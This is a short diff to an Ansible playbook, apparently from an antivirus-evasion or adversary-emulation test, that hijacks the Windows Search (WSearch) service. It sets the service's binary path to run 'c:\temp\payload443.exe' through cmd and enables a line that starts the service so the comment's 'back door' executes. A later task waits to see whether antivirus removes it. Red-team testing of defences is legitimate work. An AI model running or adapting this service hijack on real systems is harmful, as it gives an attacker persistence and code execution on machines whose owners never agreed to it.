@@ -7,9 +7,9 @@
   - name: Modify service path for WSearch service
     tags: always
     win_command: |
-      sc config WSearch binpath= "cmd /c {{ backdoor_exe }}"  
+      sc config WSearch binpath= "cmd /c c:\temp\payload443.exe"  
   # start the service to execute the back door
-  # sc start WSearch
+      sc start WSearch
       
   - name: sleep for 10 seconds and continue with play to check if AV removed or Not
     tags: always
